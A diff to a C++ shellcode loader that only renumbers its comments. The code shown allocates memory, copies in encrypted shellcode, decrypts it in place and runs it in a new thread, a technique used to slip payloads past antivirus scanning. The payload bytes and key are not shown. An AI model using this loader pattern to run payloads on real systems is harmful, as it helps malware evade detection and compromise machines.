@@ -28,7 +28,7 @@ int main()
 	getchar();
 #endif
 
-	// Allocate the memory
+	// Step 1 : Allocate the memory
 	void* memory = VirtualAlloc(nullptr,
 								sizeof(shellcode),
 								MEM_COMMIT,
@@ -45,7 +45,7 @@ int main()
 	getchar();
 #endif
 
-	// Move the shellcode to the allocated memory
+	// Step 2 : Copy the encrypted shellcode to the allocated memory
 	memcpy(memory,
 		   shellcode,
 		   sizeof(shellcode));
@@ -56,7 +56,7 @@ int main()
 	getchar();
 #endif
 
-	// Decrypt the payload
+	// Step 3 : Decrypt the payload
 	decrypt_payload((unsigned char*) memory, sizeof(shellcode), key, sizeof(key));
 
 #if DEBUG
@@ -65,7 +65,7 @@ int main()
 	getchar();
 #endif
 
-	// Create a thread pointing to the shellcode address
+	// Step 4 : Create a thread pointing to the shellcode address
 	HANDLE thread =	CreateThread(nullptr,
 				 0,
 				 (LPTHREAD_START_ROUTINE) memory,
